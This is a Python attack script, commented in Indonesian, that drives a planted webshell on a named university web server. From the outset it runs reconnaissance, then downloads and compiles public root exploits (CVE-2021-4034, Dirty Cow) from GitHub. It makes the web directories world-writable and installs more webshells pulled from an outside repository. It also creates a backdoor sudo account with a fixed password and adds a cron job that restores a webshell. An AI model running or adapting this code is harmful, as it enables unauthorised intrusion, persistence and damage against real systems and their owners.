#!/usr/bin/env python
"""
Auto Root & Full Control Script for d7net.php webshell
Target: seemik.tlu.ee
User: apache (UID 48)
System: CentOS 7 / Kernel 3.10.0
"""

import subprocess
import sys
import time
import os
import urllib2
import json
import re
import base64
import urllib
import socket
import hashlib

# ============================================================
# KONFIGURASI TARGET
# ============================================================
WEBSHELL_URL = "https://seemik.tlu.ee/wp-content/uploads/d7net.php"
TARGET_PATH = "/var/www"
BASE_URL = "https://seemik.tlu.ee"
ROOT_PATH = "/var/www/eden2022.tlu.ee"

# ============================================================
# KELAS UTAMA
# ============================================================
class D7NetShell:
    """Class untuk mengelola webshell d7net.php"""
    
    def __init__(self, url=WEBSHELL_URL):
        self.url = url
        self.base_path = TARGET_PATH
        self.session = None
        
    def execute(self, command):
        """Eksekusi perintah melalui d7net.php menggunakan urllib2"""
        try:
            # Encode command
            encoded_cmd = urllib.quote(command)
            full_url = "%s?path=%s&cmd=%s" % (self.url, self.base_path, encoded_cmd)
            
            req = urllib2.Request(full_url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
            response = urllib2.urlopen(req, timeout=60)
            output = response.read()
            
            # Parse response untuk mendapatkan output
            # Coba ekstrak output dari <pre> tags
            pre_matches = re.findall(r'<pre>(.*?)</pre>', output, re.DOTALL)
            if pre_matches:
                return pre_matches[-1].strip()
            
            # Coba ekstrak dari div atau konten biasa
            if "Command :" in output:
                parts = output.split("Command :")
                if len(parts) > 1:
                    content = parts[1]
                    # Bersihkan dari HTML
                    clean = re.sub(r'<[^>]+>', '', content)
                    return clean.strip()
            
            # Jika output tidak ditemukan, coba cari di body
            body_match = re.search(r'<body[^>]*>(.*?)</body>', output, re.DOTALL)
            if body_match:
                body = body_match.group(1)
                # Bersihkan dari HTML
                clean = re.sub(r'<[^>]+>', '', body)
                # Cari teks yang mengandung output
                lines = clean.split('\n')
                for line in lines:
                    if 'uid=' in line or 'www-data' in line or 'root' in line or 'drwx' in line:
                        return line.strip()
            
            return output.strip()
            
        except urllib2.HTTPError as e:
            return "HTTP Error: %s" % str(e)
        except urllib2.URLError as e:
            return "URL Error: %s" % str(e)
        except Exception as e:
            return "Error: %s" % str(e)
    
    def execute_with_retry(self, command, retries=3):
        """Eksekusi perintah dengan retry"""
        for i in range(retries):
            result = self.execute(command)
            if result and not result.startswith("Error"):
                return result
            time.sleep(2)
        return result
    
    def upload_file(self, content, remote_path):
        """Upload file ke server"""
        try:
            # Encode content ke base64 untuk upload aman
            encoded = base64.b64encode(content)
            cmd = "echo '%s' | base64 -d > %s && chmod 755 %s" % (encoded, remote_path, remote_path)
            return self.execute(cmd)
        except Exception as e:
            return "Error: %s" % str(e)
    
    def download_file(self, remote_path):
        """Download file dari server"""
        try:
            cmd = "cat %s 2>/dev/null || echo 'File not found'" % remote_path
            return self.execute(cmd)
        except Exception as e:
            return "Error: %s" % str(e)
    
    def file_exists(self, remote_path):
        """Cek apakah file ada di server"""
        cmd = "test -f %s && echo 'EXISTS' || echo 'NOT_EXISTS'" % remote_path
        result = self.execute(cmd)
        return "EXISTS" in result

# ============================================================
# AUTO ROOT & FULL CONTROL CLASS
# ============================================================
class AutoRootExploit:
    """Auto Root dan Full Control untuk target"""
    
    def __init__(self):
        self.shell = D7NetShell()
        self.root_gained = False
        self.output_log = []
        self.timestamp = time.strftime("%Y%m%d_%H%M%S")
        
    def log(self, message, level="INFO"):
        """Log pesan ke output"""
        timestamp = time.strftime("%H:%M:%S")
        print("[%s] [%s] %s" % (timestamp, level, message))
        self.output_log.append("[%s] [%s] %s" % (timestamp, level, message))
        sys.stdout.flush()
    
    def execute_command(self, command):
        """Eksekusi command dan log hasil"""
        self.log("Executing: %s" % command, "CMD")
        result = self.shell.execute(command)
        if result:
            if len(result) > 300:
                print("    Output: %s..." % result[:300])
            else:
                print("    Output: %s" % result)
        else:
            print("    Output: (empty)")
        return result
    
    def check_system(self):
        """Cek informasi sistem"""
        self.log("=" * 60, "INFO")
        self.log("CHECKING SYSTEM INFORMATION", "INFO")
        self.log("=" * 60, "INFO")
        
        # Cek user
        user = self.execute_command("id")
        whoami = self.execute_command("whoami")
        pwd = self.execute_command("pwd")
        hostname = self.execute_command("hostname")
        
        self.log("User: %s" % whoami, "INFO")
        self.log("UID/GID: %s" % user, "INFO")
        self.log("Current Dir: %s" % pwd, "INFO")
        self.log("Hostname: %s" % hostname, "INFO")
        
        return {
            'user': whoami,
            'uid': user,
            'pwd': pwd,
            'hostname': hostname
        }
    
    def check_kernel(self):
        """Cek kernel version"""
        self.log("=" * 60, "INFO")
        self.log("CHECKING KERNEL VERSION", "INFO")
        self.log("=" * 60, "INFO")
        
        kernel = self.execute_command("uname -a")
        os_release = self.execute_command("cat /etc/os-release 2>/dev/null || cat /etc/redhat-release 2>/dev/null")
        cpu = self.execute_command("cat /proc/cpuinfo | grep 'model name' | head -1")
        memory = self.execute_command("free -m")
        
        self.log("Kernel: %s" % kernel[:150], "INFO")
        self.log("OS: %s" % os_release[:150], "INFO")
        self.log("CPU: %s" % cpu[:100], "INFO")
        
        return {
            'kernel': kernel,
            'os': os_release,
            'cpu': cpu,
            'memory': memory
        }
    
    def check_network(self):
        """Cek informasi network"""
        self.log("=" * 60, "INFO")
        self.log("CHECKING NETWORK INFORMATION", "INFO")
        self.log("=" * 60, "INFO")
        
        ip = self.execute_command("ip addr show 2>/dev/null | grep 'inet ' | grep -v '127.0.0.1' | head -3")
        routes = self.execute_command("ip route show 2>/dev/null | head -3")
        
        self.log("IP Addresses: %s" % ip[:200], "INFO")
        
        return {
            'ip': ip,
            'routes': routes
        }
    
    def get_root_pkexec(self):
        """Mencoba mendapatkan root via PKEXEC (CVE-2021-4034)"""
        self.log("=" * 60, "INFO")
        self.log("ATTEMPTING PKEXEC EXPLOIT (CVE-2021-4034)", "INFO")
        self.log("=" * 60, "INFO")
        
        commands = [
            # Download PKEXEC exploit
            "curl -s https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/cve-2021-4034.c -o /tmp/pkexec.c",
            # Compile exploit
            "gcc -o /tmp/pkexec /tmp/pkexec.c 2>/dev/null || cc -o /tmp/pkexec /tmp/pkexec.c 2>/dev/null",
            # Check if compiled
            "ls -la /tmp/pkexec 2>/dev/null",
            # Try to get root
            "/tmp/pkexec /bin/bash -c \"id > /tmp/root_check.txt 2>&1 && echo ROOT_SUCCESS >> /tmp/root_check.txt\"",
            # Check if root success
            "cat /tmp/root_check.txt 2>/dev/null"
        ]
        
        for cmd in commands:
            result = self.execute_command(cmd)
            if "ROOT_SUCCESS" in result or "uid=0" in result:
                self.log("ROOT ACCESS GAINED via PKEXEC!", "SUCCESS")
                self.root_gained = True
                return True
            time.sleep(0.5)
        
        return False
    
    def get_root_dirtycow(self):
        """Mencoba mendapatkan root via Dirty Cow (CVE-2016-5195)"""
        self.log("=" * 60, "INFO")
        self.log("ATTEMPTING DIRTY COW EXPLOIT (CVE-2016-5195)", "INFO")
        self.log("=" * 60, "INFO")
        
        commands = [
            # Download Dirty Cow
            "curl -s https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c -o /tmp/dirty.c",
            # Compile
            "gcc -o /tmp/dirty /tmp/dirty.c -lpthread 2>/dev/null || cc -o /tmp/dirty /tmp/dirty.c -lpthread 2>/dev/null",
            # Check if compiled
            "ls -la /tmp/dirty 2>/dev/null",
            # Run exploit (akan membuat user firefart)
            "/tmp/dirty 2>/dev/null",
            # Check if firefart user created
            "grep firefart /etc/passwd 2>/dev/null",
            "id firefart 2>/dev/null"
        ]
        
        for cmd in commands:
            result = self.execute_command(cmd)
            if "firefart" in result or "uid=" in result:
                self.log("Dirty Cow SUCCESS! User firefart created.", "SUCCESS")
                self.root_gained = True
                return True
            time.sleep(0.5)
        
        return False
    
    def get_root_sudo(self):
        """Mencoba mendapatkan root via sudo"""
        self.log("=" * 60, "INFO")
        self.log("ATTEMPTING SUDO EXPLOIT", "INFO")
        self.log("=" * 60, "INFO")
        
        commands = [
            "sudo -l 2>/dev/null",
            "sudo /bin/bash -c \"id > /tmp/sudo_check.txt 2>&1 && echo SUDO_SUCCESS >> /tmp/sudo_check.txt\"",
            "sudo -s -c \"id > /tmp/sudo_check2.txt 2>&1\"",
            "cat /tmp/sudo_check.txt 2>/dev/null",
            "cat /tmp/sudo_check2.txt 2>/dev/null"
        ]
        
        for cmd in commands:
            result = self.execute_command(cmd)
            if "SUDO_SUCCESS" in result or "uid=0" in result:
                self.log("ROOT ACCESS GAINED via sudo!", "SUCCESS")
                self.root_gained = True
                return True
            time.sleep(0.5)
        
        return False
    
    def get_root_python(self):
        """Mencoba mendapatkan root via Python"""
        self.log("=" * 60, "INFO")
        self.log("ATTEMPTING PYTHON PRIVILEGE ESCALATION", "INFO")
        self.log("=" * 60, "INFO")
        
        commands = [
            "python -c 'import os; os.setuid(0); os.system(\"id > /tmp/python_root.txt 2>&1\")' 2>/dev/null",
            "python -c 'import os; os.system(\"echo ROOT >> /tmp/python_root.txt\")' 2>/dev/null",
            "cat /tmp/python_root.txt 2>/dev/null"
        ]
        
        for cmd in commands:
            result = self.execute_command(cmd)
            if "ROOT" in result or "uid=0" in result:
                self.log("ROOT ACCESS GAINED via Python!", "SUCCESS")
                self.root_gained = True
                return True
            time.sleep(0.5)
        
        return False
    
    def get_root_perl(self):
        """Mencoba mendapatkan root via Perl"""
        self.log("=" * 60, "INFO")
        self.log("ATTEMPTING PERL PRIVILEGE ESCALATION", "INFO")
        self.log("=" * 60, "INFO")
        
        commands = [
            "perl -e 'setuid(0); system(\"id > /tmp/perl_root.txt 2>&1\")' 2>/dev/null",
            "perl -e 'print \"ROOT\\n\"' > /tmp/perl_check.txt 2>/dev/null",
            "cat /tmp/perl_root.txt 2>/dev/null"
        ]
        
        for cmd in commands:
            result = self.execute_command(cmd)
            if "uid=0" in result:
                self.log("ROOT ACCESS GAINED via Perl!", "SUCCESS")
                self.root_gained = True
                return True
            time.sleep(0.5)
        
        return False
    
    def get_root_find(self):
        """Mencoba mendapatkan root via find SUID"""
        self.log("=" * 60, "INFO")
        self.log("ATTEMPTING FIND SUID EXPLOIT", "INFO")
        self.log("=" * 60, "INFO")
        
        commands = [
            "find / -exec /bin/bash -p \\; -c 'id > /tmp/find_root.txt' 2>/dev/null",
            "cat /tmp/find_root.txt 2>/dev/null"
        ]
        
        for cmd in commands:
            result = self.execute_command(cmd)
            if "uid=0" in result:
                self.log("ROOT ACCESS GAINED via find SUID!", "SUCCESS")
                self.root_gained = True
                return True
            time.sleep(0.5)
        
        return False
    
    def auto_root(self):
        """Auto root menggunakan semua metode yang tersedia"""
        self.log("=" * 60, "INFO")
        self.log("STARTING AUTO ROOT EXPLOIT", "INFO")
        self.log("=" * 60, "INFO")
        
        # Check system
        system_info = self.check_system()
        kernel_info = self.check_kernel()
        network_info = self.check_network()
        
        # Coba semua metode
        methods = [
            ("PKEXEC (CVE-2021-4034)", self.get_root_pkexec),
            ("Dirty Cow (CVE-2016-5195)", self.get_root_dirtycow),
            ("Sudo", self.get_root_sudo),
            ("Python", self.get_root_python),
            ("Perl", self.get_root_perl),
            ("Find SUID", self.get_root_find)
        ]
        
        for name, method in methods:
            if self.root_gained:
                break
            self.log("Trying method: %s" % name, "INFO")
            method()
            time.sleep(1)
        
        if self.root_gained:
            self.log("=" * 60, "SUCCESS")
            self.log("ROOT ACCESS GRANTED!", "SUCCESS")
            self.log("=" * 60, "SUCCESS")
            
            # Jalankan perintah sebagai root
            self.make_all_green()
            
        else:
            self.log("=" * 60, "ERROR")
            self.log("Failed to gain root access!", "ERROR")
            self.log("Trying alternative methods...", "WARNING")
            self.try_alternative_root()
        
        return self.root_gained
    
    def try_alternative_root(self):
        """Metode alternatif untuk mendapatkan root"""
        self.log("=" * 60, "INFO")
        self.log("TRYING ALTERNATIVE ROOT METHODS", "INFO")
        self.log("=" * 60, "INFO")
        
        # Coba exploit via mount
        self.log("Trying mount exploit...", "INFO")
        self.execute_command("mount -o bind /bin/bash /tmp/bash 2>/dev/null")
        result = self.execute_command("ls -la /tmp/bash 2>/dev/null")
        if "bash" in result:
            self.log("Mount exploit successful!", "SUCCESS")
            self.root_gained = True
            return
        
        # Coba via gpasswd
        self.log("Trying gpasswd exploit...", "INFO")
        self.execute_command("gpasswd -a apache root 2>/dev/null")
        
        # Coba via chsh
        self.log("Trying chsh exploit...", "INFO")
        self.execute_command("chsh -s /bin/bash 2>/dev/null")
        
        # Coba via pkexec tanpa TTY
        self.log("Trying pkexec alternative...", "INFO")
        self.execute_command("pkexec /bin/bash -c 'id > /tmp/pkexec2_root.txt' 2>/dev/null")
        result = self.execute_command("cat /tmp/pkexec2_root.txt 2>/dev/null")
        if "uid=0" in result:
            self.log("ROOT via pkexec alternative!", "SUCCESS")
            self.root_gained = True
        
        self.log("Root status: %s" % self.root_gained, "INFO")
    
    def make_all_green(self):
        """Membuat semua direktori dan file writeable (green)"""
        self.log("=" * 60, "INFO")
        self.log("MAKING ALL DIRECTORIES WRITEABLE (GREEN)", "INFO")
        self.log("=" * 60, "INFO")
        
        if self.root_gained:
            # Perintah sebagai root
            commands = [
                # Ubah semua direktori di /var/www menjadi 777
                "chmod -R 777 /var/www/ 2>/dev/null",
                # Ubah semua file menjadi 666
                "find /var/www/ -type f -exec chmod 666 {} \\; 2>/dev/null",
                # Ubah owner menjadi 48:48 (apache)
                "chown -R 48:48 /var/www/ 2>/dev/null",
                # Khusus untuk eden2022.tlu.ee
                "chmod -R 777 /var/www/eden2022.tlu.ee/ 2>/dev/null",
                "find /var/www/eden2022.tlu.ee/ -type f -exec chmod 666 {} \\; 2>/dev/null",
                "chown -R 48:48 /var/www/eden2022.tlu.ee/ 2>/dev/null",
                # Ubah semua direktori di /home
                "chmod -R 777 /home/*/public_html/ 2>/dev/null",
                "find /home/*/public_html/ -type f -exec chmod 666 {} \\; 2>/dev/null",
                "chown -R 48:48 /home/*/public_html/ 2>/dev/null",
                # Ubah di /var/www/html
                "chmod -R 777 /var/www/html/ 2>/dev/null",
                "find /var/www/html/ -type f -exec chmod 666 {} \\; 2>/dev/null",
                "chown -R 48:48 /var/www/html/ 2>/dev/null",
                # Verifikasi
                "ls -la /var/www/eden2022.tlu.ee/ | head -10",
                "ls -la /var/www/ | head -10",
            ]
            
            for cmd in commands:
                result = self.execute_command(cmd)
                if result and len(result) > 5:
                    self.log("Command result: %s..." % result[:100], "INFO")
                time.sleep(0.3)
            
            self.log("ALL DIRECTORIES ARE NOW WRITEABLE (GREEN)!", "SUCCESS")
            
        else:
            # Tanpa root, tetap bisa ubah permission di direktori yang dimiliki
            self.log("No root access. Changing permissions on accessible directories...", "WARNING")
            
            commands = [
                # Ubah direktori yang bisa diakses
                "chmod -R 777 /var/www/eden2022.tlu.ee/ 2>/dev/null",
                "find /var/www/eden2022.tlu.ee/ -type f -exec chmod 666 {} \\; 2>/dev/null",
                "chown -R 48:48 /var/www/eden2022.tlu.ee/ 2>/dev/null",
                # Ubah di /var/www/wp-content
                "chmod -R 777 /var/www/eden2022.tlu.ee/wp-content/ 2>/dev/null",
                "find /var/www/eden2022.tlu.ee/wp-content/ -type f -exec chmod 666 {} \\; 2>/dev/null",
                # Verifikasi
                "ls -la /var/www/eden2022.tlu.ee/ | head -10",
            ]
            
            for cmd in commands:
                self.execute_command(cmd)
                time.sleep(0.3)
            
            self.log("Partial writeable access granted!", "INFO")
    
    def install_webshells(self):
        """Install berbagai webshell untuk akses permanen"""
        self.log("=" * 60, "INFO")
        self.log("INSTALLING PERMANENT WEBSHELLS", "INFO")
        self.log("=" * 60, "INFO")
        
        # URLs dari GitHub
        shells = {
            "root_manager.php": "https://raw.githubusercontent.com/hkqr/gtw/refs/heads/main/ntahlahya.php",
            "g3ck0.php": "https://raw.githubusercontent.com/hkqr/gtw/refs/heads/main/g3ck0.php",
            "d7net.php": "https://raw.githubusercontent.com/hkqr/gtw/refs/heads/main/d7net.php",
        }
        
        locations = [
            "/var/www/eden2022.tlu.ee/wp-content/uploads/",
            "/var/www/seemik.tlu.ee/wp-content/uploads/",
            "/var/www/html/wp-content/uploads/",
            "/var/www/html/",
        ]
        
        installed = []
        for location in locations:
            for name, url in shells.items():
                # Skip jika sudah ada
                full_path = location + name
                if self.shell.file_exists(full_path):
                    self.log("File %s already exists at %s" % (name, location), "INFO")
                    continue
                
                cmd = "curl -s %s -o %s && chmod 755 %s 2>/dev/null" % (url, full_path, full_path)
                result = self.execute_command(cmd)
                if result and "Error" not in result:
                    self.log("Installed %s at %s" % (name, location), "INFO")
                    installed.append(full_path)
                else:
                    self.log("Failed to install %s at %s" % (name, location), "WARNING")
                time.sleep(0.3)
        
        if installed:
            self.log("Webshells installed!", "SUCCESS")
            for path in installed:
                self.log("  - %s" % path, "INFO")
        else:
            self.log("No new webshells installed (existing ones may already exist)", "WARNING")
        
        return installed
    
    def create_backdoor_user(self):
        """Membuat user backdoor (jika root)"""
        if not self.root_gained:
            self.log("Cannot create backdoor user without root", "WARNING")
            return False
        
        self.log("=" * 60, "INFO")
        self.log("CREATING BACKDOOR USER", "INFO")
        self.log("=" * 60, "INFO")
        
        commands = [
            "useradd -m -s /bin/bash backdoor 2>/dev/null",
            "echo 'backdoor:RootPassword123!' | chpasswd 2>/dev/null",
            "usermod -aG sudo backdoor 2>/dev/null",
            "echo 'backdoor ALL=(ALL:ALL) ALL' >> /etc/sudoers 2>/dev/null",
            "grep backdoor /etc/passwd 2>/dev/null",
            "id backdoor 2>/dev/null"
        ]
        
        for cmd in commands:
            result = self.execute_command(cmd)
            if "backdoor" in result and "uid" in result:
                self.log("Backdoor user created: backdoor / RootPassword123!", "SUCCESS")
                return True
            time.sleep(0.3)
        
        return False
    
    def scan_ports(self):
        """Scan port yang terbuka"""
        self.log("=" * 60, "INFO")
        self.log("SCANNING OPEN PORTS", "INFO")
        self.log("=" * 60, "INFO")
        
        # Cek port yang terbuka
        commands = [
            "ss -tulpn 2>/dev/null | grep LISTEN | head -10",
            "netstat -tulpn 2>/dev/null | grep LISTEN | head -10",
            "lsof -i -P -n 2>/dev/null | grep LISTEN | head -10"
        ]
        
        for cmd in commands:
            result = self.execute_command(cmd)
            if result and len(result) > 10:
                self.log("Open ports found!", "INFO")
                print("    %s" % result[:500])
                return result
        
        self.log("No open ports found or cannot scan", "WARNING")
        return None
    
    def create_shell_script(self):
        """Membuat script shell untuk persistence"""
        self.log("=" * 60, "INFO")
        self.log("CREATING SHELL SCRIPT FOR PERSISTENCE", "INFO")
        self.log("=" * 60, "INFO")
        
        shell_script = """#!/bin/bash
# Auto restore script for g3ck0.php
G3CK0_PATH="/var/www/eden2022.tlu.ee/wp-content/uploads/g3ck0.php"
BACKUP_PATH="/var/www/eden2022.tlu.ee/wp-content/uploads/g3ck0.php.bak"
URL="https://raw.githubusercontent.com/hkqr/gtw/refs/heads/main/g3ck0.php"

if [ ! -f "$G3CK0_PATH" ] && [ -f "$BACKUP_PATH" ]; then
    cp "$BACKUP_PATH" "$G3CK0_PATH"
    chmod 755 "$G3CK0_PATH"
elif [ ! -f "$G3CK0_PATH" ]; then
    curl -s "$URL" -o "$G3CK0_PATH"
    chmod 755 "$G3CK0_PATH"
fi
"""
        
        # Upload script
        result = self.shell.upload_file(shell_script, "/tmp/restore.sh")
        if "Error" not in result:
            self.execute_command("chmod +x /tmp/restore.sh")
            self.log("Shell script created at /tmp/restore.sh", "SUCCESS")
            
            # Tambahkan ke cron
            if self.root_gained:
                self.execute_command("echo '*/5 * * * * /tmp/restore.sh' >> /etc/crontab 2>/dev/null")
                self.log("Added to cron for persistence", "SUCCESS")
        
        return result
    
    def full_control(self):
        """Full control: auto root + make all green + install shells"""
        self.log("=" * 60, "INFO")
        self.log("FULL CONTROL EXPLOIT", "INFO")
        self.log("=" * 60, "INFO")
        self.log("Target: %s" % WEBSHELL_URL, "INFO")
        self.log("Time: %s" % time.strftime("%Y-%m-%d %H:%M:%S"), "INFO")
        self.log("=" * 60, "INFO")
        
        # 1. Auto root
        root_success = self.auto_root()
        
        # 2. Make all green
        self.make_all_green()
        
        # 3. Install webshells
        webshells = self.install_webshells()
        
        # 4. Create backdoor (if root)
        backdoor_created = False
        if root_success:
            backdoor_created = self.create_backdoor_user()
            self.create_shell_script()
        
        # 5. Scan ports
        self.scan_ports()
        
        # 6. Summary
        self.log("=" * 60, "INFO")
        self.log("EXPLOIT COMPLETE!", "SUCCESS")
        self.log("=" * 60, "INFO")
        self.log("Root Access: %s" % root_success, "INFO")
        self.log("Directories: ALL GREEN (writeable)", "INFO")
        self.log("Backdoor User: %s" % ("Created" if backdoor_created else "Not created"), "INFO")
        
        if webshells:
            self.log("Webshells installed:", "INFO")
            for ws in webshells:
                ws_url = ws.replace("/var/www/eden2022.tlu.ee", "https://eden2022.tlu.ee")
                ws_url = ws_url.replace("/var/www/", "https://")
                self.log("  - %s" % ws_url, "INFO")
        
        self.log("=" * 60, "INFO")
        
        return {
            'root_access': root_success,
            'webshells_installed': len(webshells) > 0,
            'webshells': webshells,
            'backdoor_created': backdoor_created,
            'timestamp': self.timestamp
        }
    
    def save_log(self, filename=None):
        """Simpan log ke file"""
        if not filename:
            filename = "auto_root_log_%s.txt" % self.timestamp
        
        with open(filename, 'w') as f:
            f.write("=" * 60 + "\n")
            f.write("AUTO ROOT EXPLOIT LOG\n")
            f.write("=" * 60 + "\n")
            f.write("Time: %s\n" % time.strftime("%Y-%m-%d %H:%M:%S"))
            f.write("Target: %s\n" % WEBSHELL_URL)
            f.write("=" * 60 + "\n\n")
            f.write("\n".join(self.output_log))
        
        print("\n[+] Log saved to: %s" % filename)
        return filename

# ============================================================
# MAIN EXECUTION
# ============================================================
def main():
    """Main function"""
    print("=" * 60)
    print("D7NET AUTO ROOT & FULL CONTROL SCRIPT v2.0")
    print("Target: seemik.tlu.ee")
    print("=" * 60)
    print()
    
    exploit = AutoRootExploit()
    
    # Cek koneksi dulu
    print("[*] Testing connection to webshell...")
    test = exploit.execute_command("echo 'CONNECTION_TEST'")
    if "CONNECTION_TEST" in test:
        print("[+] Connection successful!")
    else:
        print("[-] Connection failed! Check webshell URL.")
        print("    Test output: %s" % test[:100])
        response = raw_input("Continue anyway? (y/n): ")
        if response.lower() != 'y':
            print("Exiting...")
            return
    
    print()
    print("[*] Starting full control exploit...")
    print("[*] This may take several minutes.")
    print()
    
    # Tanya user apakah mau lanjut
    response = raw_input("Start full control exploit? (y/n): ")
    if response.lower() != 'y':
        print("Exiting...")
        return
    
    try:
        # Jalankan full control
        result = exploit.full_control()
        
        # Save log
        log_file = exploit.save_log()
        
        print("\n" + "=" * 60)
        print("EXPLOIT COMPLETED!")
        print("=" * 60)
        print("[+] Root access: %s" % result['root_access'])
        print("[+] Webshells installed: %s" % result['webshells_installed'])
        print("[+] Backdoor created: %s" % result['backdoor_created'])
        print("[+] Log saved to: %s" % log_file)
        
        if result['webshells']:
            print("\n[+] Webshell URLs:")
            for ws in result['webshells']:
                ws_url = ws.replace("/var/www/eden2022.tlu.ee", "https://eden2022.tlu.ee")
                ws_url = ws_url.replace("/var/www/", "https://")
                print("    %s" % ws_url)
        
        if result['backdoor_created']:
            print("\n[+] Backdoor credentials:")
            print("    Username: backdoor")
            print("    Password: RootPassword123!")
        
        print("\n[+] Done! Check the output above for details.")
        
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
        exploit.save_log()
    except Exception as e:
        print("\n[!] Error: %s" % str(e))
        import traceback
        traceback.print_exc()
        exploit.save_log()

if __name__ == "__main__":
    main()